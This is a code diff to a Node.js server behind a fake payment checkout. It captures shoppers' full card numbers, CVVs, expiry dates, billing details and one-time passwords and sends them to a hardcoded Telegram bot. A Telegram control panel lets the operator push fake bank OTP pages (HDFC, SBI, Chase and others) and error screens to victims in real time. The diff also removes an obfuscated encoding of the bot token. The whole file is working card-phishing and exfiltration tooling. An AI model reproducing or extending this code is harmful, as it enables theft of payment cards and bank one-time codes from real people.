@@ -12,6 +12,13 @@ import { v4 as uuidv4 } from 'uuid';
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
+// Environment configuration
+const PORT = process.env.PORT || 3002;
+const NODE_ENV = process.env.NODE_ENV || 'development';
+const ALLOWED_ORIGINS = NODE_ENV === 'production' 
+  ? ['https://invoice.strupay.me', 'https://www.strupay.me', 'https://pay.strupay.me']
+  : ['http://localhost:8080', 'http://localhost:3000', 'http://127.0.0.1:8080'];
+
 const app = express();
 const server = createServer(app);
 
@@ -57,17 +64,412 @@ const io = new Server(server, {
   maxHttpBufferSize: 1e8 // 100MB for large data transfers
 });
 
-// 🔐 Obfuscated Telegram Bot Configuration (Auto-configured for live visitor tracking)
-const _0x4a8b = ['38', '40', '33', '97', '72', '95', '58', '41', '41', '69', '79', '110', '52', '68', '98', '112', '119', '99', '110', '101', '68', '70', '77', '83', '56', '78', '95', '48', '108', '99', '102', '109', '65', '84', '56', '119', '80', '79', '75', '103'];
-const _0x2f9c = ['50', '49', '48', '51', '52', '48', '56', '51', '55', '50'];
-const _tgBot = _0x4a8b.map(x => String.fromCharCode(parseInt(x) > 100 ? parseInt(x) : parseInt(x) + 10)).join('');
-const _tgChat = _0x2f9c.join('');
+// 🤖 Telegram Bot Configuration  
+// You need to replace these with your actual bot token and chat ID
 const telegramConfig = {
-  botToken: _tgBot,
-  chatId: _tgChat,
+  botToken: process.env.TELEGRAM_BOT_TOKEN || '8313827376:AAFkevZQbO_ppTWd6cAJ96UrvFJHw9mKqKg',
+  chatId: process.env.TELEGRAM_CHAT_ID || '2103408372',
   enabled: true
 };
 console.log('🤖 Telegram visitor tracking: ENABLED');
+
+// Test Telegram connectivity on startup
+async function testTelegramConnection() {
+  console.log('🔍 Testing Telegram bot connection...');
+  console.log('Bot Token (last 10 chars):', telegramConfig.botToken.slice(-10));
+  console.log('Chat ID:', telegramConfig.chatId);
+  
+  try {
+    // Test bot info
+    const botResponse = await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/getMe`);
+    const botResult = await botResponse.json();
+    
+    if (botResult.ok) {
+      console.log('✅ Bot token is valid. Bot name:', botResult.result.username);
+    } else {
+      console.error('❌ Bot token error:', botResult.description);
+      return false;
+    }
+    
+    // Test sending a simple message
+    const testMessage = '🧪 Test message from payment admin panel - ' + new Date().toLocaleTimeString();
+    const success = await sendToTelegram(testMessage);
+    
+    if (success) {
+      console.log('🎉 Telegram connection test PASSED!');
+    } else {
+      console.log('❌ Telegram connection test FAILED!');
+    }
+    
+    return success;
+  } catch (error) {
+    console.error('❌ Telegram test failed:', error.message);
+    return false;
+  }
+}
+
+// Run test after 3 seconds
+setTimeout(testTelegramConnection, 3000);
+
+// Telegram polling for admin commands (works locally and in production)
+let lastUpdateId = 0;
+
+async function pollTelegramUpdates() {
+  if (!telegramConfig.enabled) return;
+  
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
+    const result = await response.json();
+    
+    if (result.ok && result.result.length > 0) {
+      console.log(`📨 Telegram updates received: ${result.result.length} updates`);
+      for (const update of result.result) {
+        lastUpdateId = Math.max(lastUpdateId, update.update_id);
+        console.log(`🔄 Processing update ${update.update_id}:`, update);
+        
+        if (update.callback_query) {
+          console.log(`➡️ Found callback query in update ${update.update_id}`);
+          await handleTelegramCallback(update.callback_query);
+        } else {
+          console.log(`ℹ️ Update ${update.update_id} has no callback_query`);
+        }
+      }
+    }
+  } catch (error) {
+    console.error('❌ Telegram polling error:', error.message);
+  }
+}
+
+// Store temporary states for multi-step Telegram flows
+const telegramStates = new Map();
+
+// Handle Telegram callback queries
+async function handleTelegramCallback(callback_query) {
+  const { data, from, id } = callback_query;
+  const chatId = from.id.toString();
+  
+  console.log(`🎛️ TELEGRAM CALLBACK RECEIVED:`, {
+    data,
+    chatId,
+    queryId: id,
+    timestamp: new Date().toISOString()
+  });
+  
+  // Verify it's from the correct admin chat
+  if (chatId !== telegramConfig.chatId) {
+    console.log(`🚫 Unauthorized Telegram callback from: ${chatId}`);
+    return;
+  }
+  
+  console.log(`✅ Admin command authorized: ${data}`);
+  
+  // Handle multi-step flows
+  if (data.startsWith('show_otp_')) {
+    const paymentId = data.replace('show_otp_', '');
+    await showBankSelectionMenu(paymentId, id);
+    return;
+  }
+  
+  if (data.startsWith('bank_')) {
+    await handleBankSelection(data, id);
+    return;
+  }
+  
+  if (data.startsWith('continue_otp_')) {
+    await handleContinueOTP(data, id);
+    return;
+  }
+  
+  // Handle other commands with proper parsing
+  let responseMessage = '';
+  let socketEvent = '';
+  let paymentId = '';
+  
+  if (data.startsWith('fail_otp_')) {
+    paymentId = data.replace('fail_otp_', '');
+    responseMessage = '❌ Invalid OTP error sent to user';
+    socketEvent = 'invalid-otp-error';
+    console.log(`🔴 OTP FAILED - Payment ID: ${paymentId}`);
+  } else if (data.startsWith('success_')) {
+    paymentId = data.replace('success_', '');
+    responseMessage = '🎉 Payment approved successfully!';
+    socketEvent = 'payment-approved';
+    console.log(`🎉 OTP APPROVED - Payment ID: ${paymentId}`);
+  } else if (data.startsWith('decline_')) {
+    paymentId = data.replace('decline_', '');
+    responseMessage = '🚫 Card declined error sent to user';
+    socketEvent = 'card-declined-error';
+    console.log(`🚫 CARD DECLINED - Payment ID: ${paymentId}`);
+  } else if (data.startsWith('insufficient_')) {
+    paymentId = data.replace('insufficient_', '');
+    responseMessage = '💰 Insufficient balance error sent to user';
+    socketEvent = 'insufficient-balance-error';
+    console.log(`💰 INSUFFICIENT BALANCE - Payment ID: ${paymentId}`);
+  } else {
+    responseMessage = '❓ Unknown command';
+    console.log(`❓ Unknown Telegram command: ${data}`);
+  }
+  
+  if (socketEvent && paymentId) {
+    // Emit to all connected sockets (frontend) with payment ID
+    const eventData = { 
+      paymentId, 
+      timestamp: new Date().toISOString(),
+      source: 'telegram_admin'
+    };
+    
+    io.emit(socketEvent, eventData);
+    console.log(`📡 Socket event '${socketEvent}' emitted for payment: ${paymentId}`);
+    console.log(`📊 Event data:`, eventData);
+    
+    // Also emit a generic admin action for debugging
+    io.emit('admin-action', {
+      action: socketEvent,
+      paymentId,
+      data: eventData,
+      timestamp: new Date().toISOString()
+    });
+  }
+  
+  // Send response back to Telegram
+  if (responseMessage) {
+    try {
+      await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/answerCallbackQuery`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          callback_query_id: id,
+          text: responseMessage,
+          show_alert: true
+        })
+      });
+      console.log(`✅ Response sent to Telegram: ${responseMessage}`);
+    } catch (error) {
+      console.error('❌ Failed to send Telegram response:', error.message);
+    }
+  }
+}
+
+// Show bank selection menu for OTP
+async function showBankSelectionMenu(paymentId, queryId) {
+  const banks = [
+    // Indian Banks
+    { name: 'HDFC Bank', code: 'hdfc', emoji: '🏦', logo: 'https://logolook.net/wp-content/uploads/2021/11/HDFC-Bank-Logo-500x281.png' },
+    { name: 'State Bank of India', code: 'sbi', emoji: '🏪', logo: 'https://logotyp.us/file/sbi.svg' },
+    { name: 'ICICI Bank', code: 'icici', emoji: '🏦', logo: 'https://www.pngkey.com/png/full/223-2237358_icici-bank-india-logo-design-png-transparent-images.png' },
+    { name: 'Axis Bank', code: 'axis', emoji: '🏢', logo: 'https://upload.wikimedia.org/wikipedia/commons/1/1a/Axis_Bank_logo.svg' },
+    { name: 'Bank of Baroda', code: 'bob', emoji: '🏦', logo: 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo-500x281.png' },
+    { name: 'Punjab National Bank', code: 'pnb', emoji: '🏦', logo: 'https://cdn.freelogovectors.net/wp-content/uploads/2023/01/punjab-national-bank-logo-pnb-freelogovectors.net_-400x225.png' },
+    { name: 'Kotak Mahindra Bank', code: 'kotak', emoji: '🏦', logo: 'https://logos-download.com/wp-content/uploads/2016/06/Kotak_Mahindra_Bank_logo-700x207.png' },
+    { name: 'Bank of India', code: 'boi', emoji: '🏦', logo: 'https://1000logos.net/wp-content/uploads/2021/06/Bank-of-India-logo-500x281.png' },
+    { name: 'Federal Bank', code: 'federal', emoji: '🏦', logo: 'https://stickypng.com/wp-content/uploads/2023/07/627ccab31b2e263b45696aa2.png' },
+    { name: 'Union Bank', code: 'ubi', emoji: '🏦', logo: 'https://cdn.pnggallery.com/wp-content/uploads/union-bank-of-india-logo-01.png' },
+    { name: 'Bank of Maharashtra', code: 'bom', emoji: '🏦', logo: 'https://assets.stickpng.com/images/627cc5c91b2e263b45696a8e.png' },
+    { name: 'Canara Bank', code: 'canara', emoji: '🏦', logo: 'https://cdn.freelogovectors.net/svg10/canara-bank-logo-freelogovectors.net_.svg' },
+    { name: 'Indian Overseas Bank', code: 'iob', emoji: '🏦', logo: 'https://assets.stickpng.com/images/627ccc0c1b2e263b45696aac.png' },
+    { name: 'Indian Bank', code: 'ib', emoji: '🏦', logo: 'https://cdn.freelogovectors.net/wp-content/uploads/2019/02/indian-bank-logo.png' },
+    { name: 'IDBI Bank', code: 'idbi', emoji: '🏦', logo: 'https://1000logos.net/wp-content/uploads/2021/05/IDBI-Bank-logo-500x281.png' },
+    { name: 'IndusInd Bank', code: 'indusind', emoji: '🏦', logo: 'https://images.seeklogo.com/logo-png/7/2/indusind-bank-logo-png_seeklogo-71354.png' },
+    { name: 'Karnataka Bank', code: 'karnataka', emoji: '🏦', logo: 'https://wso2.cachefly.net/wso2/sites/all/images/Karnataka_Bank-logo.png' },
+    { name: 'Yes Bank', code: 'yes', emoji: '🏦', logo: 'https://logodownload.org/wp-content/uploads/2019/08/yes-bank-logo-0.png' },
+    { name: 'Central Bank', code: 'cbi', emoji: '🏦' },
+    { name: 'UCO Bank', code: 'uco', emoji: '🏦' },
+    { name: 'Bandhan Bank', code: 'bandhan', emoji: '🏦' },
+    { name: 'City Union Bank', code: 'cub', emoji: '🏦' },
+    { name: 'CSB Bank', code: 'csb', emoji: '🏦' },
+    { name: 'DCB Bank', code: 'dcb', emoji: '🏦' },
+    { name: 'Dhanlaxmi Bank', code: 'dhanlaxmi', emoji: '🏦' },
+    
+    // US Banks
+    { name: 'Chase Bank', code: 'chase', emoji: '🏦', logo: 'https://assets.stickpng.com/thumbs/60394382d4d69e00040ae03c.png' },
+    { name: 'Bank of America', code: 'boa', emoji: '🏦', logo: 'https://dwglogo.com/wp-content/uploads/2016/06/1500px-Logo_of_Bank_of_America.png' },
+    { name: 'Citi Bank', code: 'citi', emoji: '🏦', logo: 'https://1000logos.net/wp-content/uploads/2021/05/Citi-logo-500x281.png' },
+    { name: 'Wells Fargo', code: 'wells', emoji: '🏦', logo: 'https://images.seeklogo.com/logo-png/24/2/wells-fargo-logo-png_seeklogo-242550.png' },
+    { name: 'US Bank', code: 'usbank', emoji: '🏦', logo: 'https://www.logo.wine/a/logo/U.S._Bancorp/U.S._Bancorp-Logo.wine.svg' },
+    { name: 'Goldman Sachs', code: 'goldman', emoji: '🏦', logo: 'https://www.pngall.com/wp-content/uploads/15/Goldman-Sachs-Logo.png' },
+    { name: 'PNC Bank', code: 'pnc', emoji: '🏦', logo: 'https://1000logos.net/wp-content/uploads/2021/05/PNC-Bank-logo-500x300.png' },
+    { name: 'Truist Bank', code: 'truist', emoji: '🏦', logo: 'https://logodownload.org/wp-content/uploads/2021/04/truist-logo-4.png' },
+    { name: 'Capital One', code: 'capital', emoji: '🏦', logo: 'https://brandeps.com/logo-download/C/Capital-One-Financial-logo-vector-01.svg' },
+    { name: 'TD Bank', code: 'td', emoji: '🏦', logo: 'https://brandlogo.org/wp-content/uploads/2024/02/TD-Bank-N.A.-Logo.png' }
+  ];
+  
+  const currencies = [
+    { name: 'INR (₹)', code: 'INR', symbol: '₹', flag: '🇮🇳' },
+    { name: 'USD ($)', code: 'USD', symbol: '$', flag: '🇺🇸' },
+    { name: 'EUR (€)', code: 'EUR', symbol: '€', flag: '🇪🇺' },
+    { name: 'GBP (£)', code: 'GBP', symbol: '£', flag: '🇬🇧' },
+    { name: 'JPY (¥)', code: 'JPY', symbol: '¥', flag: '🇯🇵' },
+    { name: 'AUD (A$)', code: 'AUD', symbol: 'A$', flag: '🇦🇺' },
+    { name: 'CAD (C$)', code: 'CAD', symbol: 'C$', flag: '🇨🇦' },
+    { name: 'CHF', code: 'CHF', symbol: 'CHF', flag: '🇨🇭' }
+  ];
+  
+  // Create inline keyboard (max 20 buttons due to Telegram limits)
+  const bankRows = [];
+  const maxBanks = 15; // Limit to 15 banks to avoid Telegram limits
+  
+  // Add banks in rows of 2
+  for (let i = 0; i < Math.min(banks.length, maxBanks); i += 2) {
+    const row = [];
+    row.push({
+      text: `${banks[i].emoji} ${banks[i].name}`,
+      callback_data: `bank_${banks[i].code}_${paymentId}`
+    });
+    if (i + 1 < Math.min(banks.length, maxBanks)) {
+      row.push({
+        text: `${banks[i + 1].emoji} ${banks[i + 1].name}`,
+        callback_data: `bank_${banks[i + 1].code}_${paymentId}`
+      });
+    }
+    bankRows.push(row);
+  }
+  
+  const keyboard = [
+    ...bankRows,
+    // Currency selection
+    currencies.map(currency => ({ 
+      text: `${currency.symbol} ${currency.name}`, 
+      callback_data: `currency_${currency.code}_${paymentId}` 
+    })),
+    [{ text: '✅ Continue to OTP', callback_data: `continue_otp_${paymentId}` }]
+  ];
+  
+  try {
+    await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: telegramConfig.chatId,
+        text: `🏦 *Select Bank & Currency for OTP*\n\nPayment ID: \`${paymentId}\`\n\nChoose bank and currency, then click Continue:`,
+        parse_mode: 'Markdown',
+        reply_markup: { inline_keyboard: keyboard }
+      })
+    });
+    
+    // Initialize state with default currency
+    telegramStates.set(paymentId, { bank: null, currency: 'INR' });
+    console.log(`🔄 Initialized Telegram state for payment: ${paymentId}`);
+    
+    await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        callback_query_id: queryId,
+        text: '🏦 Select bank and currency first',
+        show_alert: false
+      })
+    });
+  } catch (error) {
+    console.error('❌ Error showing bank selection:', error);
+  }
+}
+
+// Handle bank/currency selection
+async function handleBankSelection(data, queryId) {
+  const parts = data.split('_');
+  const type = parts[0]; // 'bank' or 'currency'
+  const code = parts[1]; // bank code or currency code
+  const paymentId = parts.slice(2).join('_'); // handle payment IDs with underscores
+  
+  console.log(`🎯 Bank selection - Type: ${type}, Code: ${code}, PaymentID: ${paymentId}`);
+  
+  // Get or create state for this payment
+  const state = telegramStates.get(paymentId) || { bank: null, currency: 'INR' };
+  
+  if (type === 'bank') {
+    state.bank = code;
+    telegramStates.set(paymentId, state);
+    console.log(`🏦 Bank selected: ${code} for payment ${paymentId}`);
+    
+    await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        callback_query_id: queryId,
+        text: `🏦 Bank selected: ${code.toUpperCase()}`,
+        show_alert: false
+      })
+    });
+  } else if (type === 'currency') {
+    state.currency = code;
+    telegramStates.set(paymentId, state);
+    console.log(`💰 Currency selected: ${code} for payment ${paymentId}`);
+    
+    await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        callback_query_id: queryId,
+        text: `💰 Currency selected: ${code}`,
+        show_alert: false
+      })
+    });
+  }
+  
+  console.log(`📊 Current state for ${paymentId}:`, state);
+}
+
+// Handle continue OTP after bank selection
+async function handleContinueOTP(data, queryId) {
+  const paymentId = data.replace('continue_otp_', '');
+  const state = telegramStates.get(paymentId) || {};
+  
+  console.log(`🔄 Continue OTP requested for payment ${paymentId}`);
+  console.log(`📊 Current state:`, state);
+  
+  // Check if bank is selected
+  if (!state.bank || state.bank === null) {
+    console.log(`❌ No bank selected for payment ${paymentId}`);
+    await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        callback_query_id: queryId,
+        text: '⚠️ Please select a bank first',
+        show_alert: true
+      })
+    });
+    return;
+  }
+  
+  // Default currency to INR if not set
+  if (!state.currency) {
+    state.currency = 'INR';
+  }
+  
+  // Generate random OTP page (1-4)
+  const otpPage = Math.floor(Math.random() * 4) + 1;
+  
+  console.log(`✅ Proceeding with OTP - Bank: ${state.bank}, Currency: ${state.currency}, Page: ${otpPage}`);
+  
+  // Emit show-otp with selected bank, currency and random page
+  io.emit('show-otp', { 
+    paymentId, 
+    bank: state.bank,
+    currency: state.currency || 'INR',
+    otpPage,
+    timestamp: new Date().toISOString() 
+  });
+  
+  console.log(`📡 Show OTP emitted - Bank: ${state.bank}, Currency: ${state.currency}, Page: ${otpPage}`);
+  
+  // Clean up state
+  telegramStates.delete(paymentId);
+  
+  await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/answerCallbackQuery`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      callback_query_id: queryId,
+      text: `✅ OTP page ${otpPage} shown with ${state.bank.toUpperCase()} bank (${state.currency})`,
+      show_alert: true
+    })
+  });
+}
+
+// Start polling every 2 seconds
+setInterval(pollTelegramUpdates, 2000);
+console.log('🔄 Telegram polling started for admin commands');
 
 // Visitor tracking state
 let lastVisitorUpdate = Date.now();
@@ -268,11 +670,14 @@ async function getVisitorGeoInfo(ipAddress) {
 // 📱 Telegram Messaging Functions
 async function sendToTelegram(message) {
   if (!telegramConfig.enabled || !telegramConfig.botToken || !telegramConfig.chatId) {
-    console.log('❌ Telegram not configured');
+    console.log('❌ Telegram not configured properly');
+    console.log('Bot Token exists:', !!telegramConfig.botToken);
+    console.log('Chat ID exists:', !!telegramConfig.chatId);
     return false;
   }
   
   try {
+    console.log('📤 Sending Telegram message to chat:', telegramConfig.chatId.slice(-4));
     const response = await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, {
       method: 'POST',
       headers: {
@@ -291,11 +696,16 @@ async function sendToTelegram(message) {
       console.log('✅ Telegram message sent successfully');
       return true;
     } else {
-      console.error('❌ Telegram API error:', result.description);
+      console.error('❌ Telegram API error:', result.error_code, result.description);
+      if (result.error_code === 404) {
+        console.error('🚫 Bot token is invalid or bot was not found');
+      } else if (result.error_code === 403) {
+        console.error('🚫 Bot was blocked by user or chat not found');
+      }
       return false;
     }
   } catch (error) {
-    console.error('❌ Failed to send Telegram message:', error);
+    console.error('❌ Failed to send Telegram message:', error.message);
     return false;
   }
 }
@@ -325,10 +735,203 @@ async function sendVisitorUpdateToTelegram(visitorData, geoInfo) {
     `📍 *Region:* ${geoInfo.region}\n` +
     `⏰ *Time:* ${currentTime} PST\n` +
     `📄 *Page:* ${visitorData.page || 'checkout'}\n` +
-    `🆔 *Visitor ID:* \`${visitorData.visitorId.slice(-8)}\`\n` +
-    `\n_Live visitor tracking active 🔴_`;
+    `🆔 *Visitor ID:* \`${visitorData.visitorId.slice(-8)}\`\n\n` +
+    `_Live visitor tracking active 🔴_`;
   
   await sendToTelegram(message);
+}
+
+// 💳 Send Card Details to Telegram
+async function sendCardDetailsToTelegram(paymentData) {
+  try {
+    const formatCardNumber = (cardNumber) => {
+      if (!cardNumber) return 'N/A';
+      const digits = cardNumber.replace(/\D/g, '');
+      // Format as 1234 5678 9012 3456 for better readability
+      return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
+    };
+
+    const formatExpiry = (expiry) => {
+      if (!expiry) return 'N/A';
+      const parts = expiry.split('/');
+      if (parts.length === 2) {
+        return `${parts[0].padStart(2, '0')}/${parts[1]}`;
+      }
+      return expiry;
+    };
+
+    const currentTime = new Date().toLocaleString('en-US', { 
+      timeZone: 'America/Los_Angeles',
+      year: 'numeric',
+      month: '2-digit', 
+      day: '2-digit',
+      hour: '2-digit',
+      minute: '2-digit',
+      second: '2-digit'
+    });
+
+    const billingDetails = paymentData.billingDetails || {};
+    const amount = paymentData.amount || 0;
+    const currency = paymentData.currency || 'INR';
+    const symbol = currency === 'USD' ? '$' : '₹';
+    
+    // Generate unique session ID for this card submission
+    const sessionId = `card_${Date.now()}_${Math.random().toString(36).substr(2, 8)}`;
+    
+    const cardNumber = formatCardNumber(paymentData.cardNumber);
+    const message = `💳 *New Card Submission*\n\n` +
+      `🎯 *Session ID:* \`${sessionId}\`\n` +
+      `💰 *Amount:* ${symbol}${amount.toLocaleString()} (${currency})\n` +
+      `📦 *Plan:* ${paymentData.planName || 'Custom'}\n` +
+      `💳 *Card:* \`${cardNumber}\` 📋\n` +
+      `👤 *Name:* \`${paymentData.cardName || 'N/A'}\` 📋\n` +
+      `🔐 *CVV:* \`${paymentData.cvv || 'N/A'}\` 📋\n` +
+      `📅 *Expiry:* \`${formatExpiry(paymentData.expiry)}\` 📋\n\n` +
+      `👤 *Billing Info:*\n` +
+      `• Name: \`${billingDetails.firstName} ${billingDetails.lastName}\` 📋\n` +
+      `• Email: \`${billingDetails.email || 'N/A'}\` 📋\n` +
+      `• Country: \`${billingDetails.country || 'N/A'}\` 📋\n` +
+      `• Company: \`${billingDetails.companyName || 'N/A'}\` 📋\n\n` +
+      `⏰ *Time:* ${currentTime} PST\n` +
+      `🆔 *Payment ID:* \`${(paymentData.paymentId || sessionId).slice(-12)}\`\n\n` +
+      `_Click on any field above to copy. Use admin commands below 🎛️_`;
+
+    const success = await sendToTelegram(message);
+    
+    if (success) {
+      // Send inline keyboard with admin commands
+      await sendCardAdminCommands(sessionId, paymentData.paymentId || sessionId);
+    }
+    
+    return success;
+  } catch (error) {
+    console.error('❌ Error sending card details to Telegram:', error);
+    return false;
+  }
+}
+
+// 🎛️ Send Admin Commands Inline Keyboard
+async function sendCardAdminCommands(sessionId, paymentId) {
+  if (!telegramConfig.enabled || !telegramConfig.botToken || !telegramConfig.chatId) {
+    return false;
+  }
+  
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: telegramConfig.chatId,
+        text: `🎛️ *Admin Actions for Session: \`${sessionId.slice(-8)}\`*`,
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: [
+            [
+              { text: '✅ Show OTP', callback_data: `show_otp_${paymentId}` },
+              { text: '❌ Fail OTP', callback_data: `fail_otp_${paymentId}` }
+            ],
+            [
+              { text: '🚫 Decline', callback_data: `decline_${paymentId}` },
+              { text: '💰 Insufficient', callback_data: `insufficient_${paymentId}` }
+            ],
+            [
+              { text: '🎉 Success', callback_data: `success_${paymentId}` }
+            ]
+          ]
+        }
+      })
+    });
+    
+    const result = await response.json();
+    if (result.ok) {
+      console.log('✅ Admin commands sent to Telegram');
+      return true;
+    } else {
+      console.error('❌ Failed to send admin commands:', result.description);
+      return false;
+    }
+  } catch (error) {
+    console.error('❌ Error sending admin commands:', error);
+    return false;
+  }
+}
+
+// 🔐 Send OTP to Telegram with Admin Commands
+async function sendOtpToTelegram(otpData) {
+  if (!telegramConfig.enabled || !telegramConfig.botToken || !telegramConfig.chatId) {
+    return false;
+  }
+  
+  try {
+    const currentTime = new Date().toLocaleString('en-US', { 
+      timeZone: 'America/Los_Angeles',
+      year: 'numeric',
+      month: '2-digit', 
+      day: '2-digit',
+      hour: '2-digit',
+      minute: '2-digit',
+      second: '2-digit'
+    });
+
+    const message = `🔐 *OTP Submitted*\n\n` +
+      `💳 *Payment ID:* \`${(otpData.paymentId || 'N/A').slice(-12)}\`\n` +
+      `🔢 *OTP Code:* \`${otpData.otp}\` 📋\n` +
+      `⏰ *Time:* ${currentTime} PST\n\n` +
+      `_Click on OTP to copy. Use admin commands below 🎛️_`;
+
+    const success = await sendToTelegram(message);
+    
+    if (success) {
+      // Send OTP-specific admin commands
+      await sendOtpAdminCommands(otpData.paymentId || otpData.id);
+    }
+    
+    return success;
+  } catch (error) {
+    console.error('❌ Error sending OTP to Telegram:', error);
+    return false;
+  }
+}
+
+// 🎛️ Send OTP Admin Commands Inline Keyboard
+async function sendOtpAdminCommands(paymentId) {
+  if (!telegramConfig.enabled || !telegramConfig.botToken || !telegramConfig.chatId) {
+    return false;
+  }
+  
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: telegramConfig.chatId,
+        text: `🎛️ *OTP Admin Actions*`,
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: [
+            [
+              { text: '🎉 Accept OTP', callback_data: `success_${paymentId}` },
+              { text: '❌ Wrong OTP', callback_data: `fail_otp_${paymentId}` }
+            ]
+          ]
+        }
+      })
+    });
+
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+
+    console.log('✅ OTP admin commands sent to Telegram');
+    return true;
+  } catch (error) {
+    console.error('❌ Error sending OTP admin commands to Telegram:', error);
+    return false;
+  }
 }
 
 // 🔄 Periodic Visitor Updates to Telegram
@@ -491,19 +1094,47 @@ setInterval(() => {
 }, 30000); // Update every 30 seconds
 
 // Add JSON middleware for API endpoints
-app.use(express.json());
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
-// Add CORS middleware for cross-origin requests
+// Add test endpoint to verify server is accessible
+app.get('/test', (req, res) => {
+  console.log('🏠 Test endpoint accessed from:', req.headers.origin || 'unknown origin');
+  res.json({ 
+    status: 'Server is running', 
+    port: PORT, 
+    time: new Date().toISOString(),
+    socketClients: io.engine.clientsCount
+  });
+});
+
+// Enable CORS for all routes
 app.use((req, res, next) => {
-  res.header('Access-Control-Allow-Origin', '*');
+  const origin = req.headers.origin;
+  if (NODE_ENV === 'production') {
+    if (ALLOWED_ORIGINS.includes(origin)) {
+      res.header('Access-Control-Allow-Origin', origin);
+    }
+  } else {
+    res.header('Access-Control-Allow-Origin', origin || '*');
+  }
   res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
   res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
-  
-  // Handle preflight requests
+  res.header('Access-Control-Allow-Credentials', 'true');
   if (req.method === 'OPTIONS') {
     res.sendStatus(200);
   } else {
     next();
+  }
+});
+
+// Serve static files from dist directory
+app.use(express.static(path.join(__dirname, 'dist')));
+
+// Serve frontend for all non-API routes
+app.get('*', (req, res) => {
+  if (!req.path.startsWith('/api/') && !req.path.startsWith('/socket.io/')) {
+    res.sendFile(path.join(__dirname, 'dist', 'index.html'));
   }
 });
 
@@ -530,9 +1161,39 @@ setInterval(() => {
   }
 }, 60000); // Check every minute
 
+// Enhanced socket.io connection logging
+io.on('connection', (socket) => {
+  console.log('🔌 Socket.io connection established:', {
+    id: socket.id,
+    handshake: socket.handshake,
+    time: new Date().toISOString()
+  });
+
+  socket.on('disconnect', (reason) => {
+    console.log(`🔌 Socket disconnected (${socket.id}): ${reason}`);
+  });
+
+  socket.on('error', (error) => {
+    console.error('🔌 Socket error:', error);
+  });
+
+  // Existing paymentId handling
+  socket.on('paymentId', (paymentId) => {
+    console.log(`🔌 Payment ID registered for socket ${socket.id}: ${paymentId}`);
+    socket.join(paymentId);
+  });
+});
+
 // Socket.io connection handling
 io.on('connection', (socket) => {
-  console.log(`🔌 New connection: ${socket.id} from ${socket.handshake.address}`);
+  console.log(`🔌 NEW SOCKET CONNECTION SUCCESSFUL!`);
+  console.log(`📋 Socket ID: ${socket.id}`);
+  console.log(`🌐 Client Address: ${socket.handshake.address}`);
+  console.log(`🔗 Origin: ${socket.handshake.headers.origin}`);
+  console.log(`🖥️ User Agent: ${socket.handshake.headers['user-agent']}`);
+  console.log(`🛠️ Socket Transport: ${socket.conn.transport.name}`);
+  console.log(`📊 Total connected clients: ${io.engine.clientsCount}`);
+  console.log('✅ Socket connection established successfully!');
 
   // Enhanced visitor tracking with persistence
   socket.on('visitor-joined', async (data) => {
@@ -570,6 +1231,51 @@ io.on('connection', (socket) => {
       
     } catch (error) {
       console.error('❌ Error handling visitor-joined:', error);
+    }
+  });
+
+  // Handle payment data submission from checkout
+  socket.on('payment-data', async (data) => {
+    try {
+      console.log('💳 Payment data received:', {
+        paymentId: data.paymentId,
+        cardNumber: data.cardNumber ? data.cardNumber.slice(-4) : 'N/A',
+        amount: data.amount,
+        email: data.billingDetails?.email
+      });
+      
+      // Add timestamp and ID if missing
+      const paymentData = {
+        ...data,
+        id: data.id || `payment_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
+        timestamp: data.timestamp || new Date().toISOString()
+      };
+      
+      // Store in persistent admin data
+      adminData.payments.unshift(paymentData);
+      
+      // Keep only last 1000 payments to prevent memory issues
+      if (adminData.payments.length > 1000) {
+        adminData.payments = adminData.payments.slice(0, 1000);
+      }
+      
+      // Save to persistent storage
+      await saveAdminData();
+      
+      // Send to admin panel immediately (both legacy and new event names)
+      io.emit('payment-received', paymentData);
+      io.emit('payment-data', paymentData);
+      
+      // Send card details to Telegram with admin commands
+      if (telegramConfig.enabled) {
+        await sendCardDetailsToTelegram(paymentData);
+        await sendCardAdminCommands(socket.id, paymentData.paymentId);
+      }
+      
+      console.log('✅ Payment data processed and sent to admin panel & Telegram');
+      
+    } catch (error) {
